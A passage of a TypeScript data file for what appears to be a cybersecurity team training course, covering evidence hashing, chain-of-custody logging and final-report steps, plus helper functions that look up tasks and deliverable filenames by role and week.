        title: 'Hash Evidence Files',
        description: 'Create SHA256 hashes for integrity verification.',
        commands: [
          { cmd: 'cd ~/team-artifacts/week-3', explain: 'Move into the week-3 evidence folder.' },
          { cmd: 'sha256sum Attack_Pcap.pcap Attack_Logs.txt SQL_Injection_Proof.txt Brute_Force_Proof.txt Reverse_Shell_Proof.txt Evidence_Photos.zip > Evidence_Hashes.txt', explain: 'Hash every artifact to lock chain of custody; save the digests.' },
        ],
        commandExplanation: '`sha256sum` fingerprints each real attack artifact; `> Evidence_Hashes.txt` stores the hashes so any later change is detectable.',
        commandFlags: [
          { flag: 'sha256sum', meaning: 'Compute a SHA-256 fingerprint of each file.' },
          { flag: '> Evidence_Hashes.txt', meaning: 'Save the hashes to the canonical file for integrity checks.' },
        ],
        expectedOutput: 'Hash file created',
        outputExplanation: 'The file holds a 64-character hash next to each filename; re-running the command later must produce identical hashes to prove nothing was altered.',
        whatItMeans: 'Proves evidence has not been tampered with.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Evidence_Hashes.txt',
        isEvidenceStep: true,
        troubleshooting: '"No such file or directory"? cd into the folder that holds the evidence first (the filenames must exist there), or hash the whole folder: sha256sum ~/team-artifacts/week-3/Evidence/*. Verify later with sha256sum -c Evidence_Hashes.txt — every line must say OK.',
      },
      {
        id: 'grc-w3-s3',
        title: 'Create Evidence Log',
        description: 'Log each piece of evidence.',
        instruction: 'Record each artifact (filename, who collected it, when, its path, and its SHA-256 hash) in the Evidence Log form.',
        whatItMeans: 'A defensible chain of custody for forensics.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Evidence Log',
      },
      {
        id: 'grc-w3-s4',
        title: 'Sign the Chain of Custody',
        description: 'Confirm the chain of custody.',
        instruction: 'In the Evidence Log form, fill the Transferred-to / Transferred-at columns for each hand-off so the chain is unbroken.',
        whatItMeans: 'Completes the chain of custody so the evidence holds up under scrutiny.',
        frameworks: ['ISO_27001', 'NIST_800_61'],
        usesForm: 'Evidence Log',
      },
      {
        id: 'grc-w3-s6',
        title: 'Summarize the Incident Findings',
        description: 'Summarize the incident findings.',
        instruction: 'Summarize what the breach proved, ranked by severity — this feeds the Final Report.',
        whatItMeans: 'Gives the Final Report an evidence-backed, ranked findings list.',
        frameworks: ['NIST_800_61', 'ISO_27001'],
      }
    ]
  },
  {
    id: 'grc-w4-report',
    role: 'grc',
    week: 4,
    title: 'Final Report & Presentation',
    objective: 'Compile and present all findings, recommendations, and incident response.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['08_Final_Report_and_Briefing.md'],
    prerequisites: ["Red's and Blue's Week 4 briefings", 'All prior SOPs, risk register, and evidence'],
    definitionOfDone: ['Findings + recommendations compiled', 'Final report PDF produced', 'Team slides assembled'],
    handoff: [
      { to: 'red', note: 'Confirm the findings are technically accurate.' },
      { to: 'blue', note: 'Confirm the response timeline is accurate.' },
    ],
    learn: ['Compiling a professional security report', 'Synthesizing Red + Blue + GRC work', 'Writing executive recommendations'],
    tools: ['Deliverables forms', 'Markdown', 'Slides'],
    steps: [
      {
        id: 'grc-w4-s1',
        title: 'Compile Findings Document',
        description: 'Compile the findings.',
        instruction: 'Compile the findings, grouped by severity, in the Final Report and Briefing form.',
        whatItMeans: 'Aggregates all findings into one ranked list.',
        frameworks: ['ISO_27001'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s2',
        title: 'Create Recommendations',
        description: 'Add recommendations.',
        instruction: 'Add a prioritized recommendation for each finding in the Final Report and Briefing form.',
        whatItMeans: 'Pairs each finding with an actionable fix.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s3',
        title: 'Compile Final Report',
        description: 'Generate the final report.',
        instruction: 'Generate the final report from the Final Report and Briefing form (Generate, then Print or Save as PDF).',
        whatItMeans: 'Merges every section into one board-ready report.',
        frameworks: ['ISO_27001'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s4',
        title: 'Assemble the Team Briefing Deck',
        description: 'Assemble the team briefing deck.',
        instruction: 'Assemble the team briefing deck: executive summary, Red findings, Blue response.',
        whatItMeans: 'Produces the single team briefing that ties Red, Blue and GRC together.',
        frameworks: ['ISO_27001', 'NIST_CSF'],
      }
    ]
  }
];

// Maps each evidence step to the deliverable file it contributes toward.
// Used by the guided task runner to show "this step produces <file>".
export const STEP_DELIVERABLES: Record<string, string> = {
  'red-w1-s3': 'Recon_Findings.md',
  'red-w2-s1': 'Nmap_Scan.txt',
  'red-w2-s2': 'Nikto_Report.txt',
  'red-w3-s1': 'SQL_Injection_Proof.txt',
  'red-w3-s2': 'Brute_Force_Proof.txt',
  'red-w3-s3': 'Reverse_Shell_Proof.txt',
  'red-w3-s4': 'Evidence_Photos.zip',
  'blue-w1-s3': 'UFW_Status.txt',
  'blue-w1-s5': 'Lynis_Report.txt',
  'blue-w1-s6': 'Windows_Firewall.txt',
  'blue-w1-s7': 'Defender_Status.txt',
  'blue-w2-s1': 'Baseline_Traffic.pcap',
  'blue-w2-s2': 'Wireshark_Filters.txt',
  'blue-w2-s3': 'Detection_Rules.txt',
  'blue-w2-s4': 'Win_EventLog.txt',
  'blue-w2-s5': 'Attack_Traffic.pcap',
  'blue-w3-s1': 'Attack_Pcap.pcap',
  'blue-w3-s2': 'Attack_Logs.txt',
  'blue-w3-s4': 'Containment_Actions.txt',
  'blue-w3-s5': 'Win_Detection.txt',
  'grc-w3-s2': 'Evidence_Hashes.txt',
};

// All deliverable filenames expected from a role for a given week.
export function getDeliverablesForWeek(role: 'red' | 'blue' | 'grc', week: number): string[] {
  const tasks = getTasksByRole(role, week);
  const set = new Set<string>();
  tasks.forEach((t) => t.deliverables.forEach((d) => set.add(d)));
  return Array.from(set);
}

// Export all tasks
export const ALL_TASKS: Task[] = [...RED_TASKS, ...BLUE_TASKS, ...GRC_TASKS];

export function getTasksByRole(role: 'red' | 'blue' | 'grc', week?: number): Task[] {
  let tasks = ALL_TASKS.filter(t => t.role === role);
  if (week) {
    tasks = tasks.filter(t => t.week === week);
  }
  return tasks;
}

export function getTaskById(id: string): Task | undefined {
  return ALL_TASKS.find(t => t.id === id);
}

export function getWeekTasks(week: number): Task[] {
  return ALL_TASKS.filter(t => t.week === week);
}
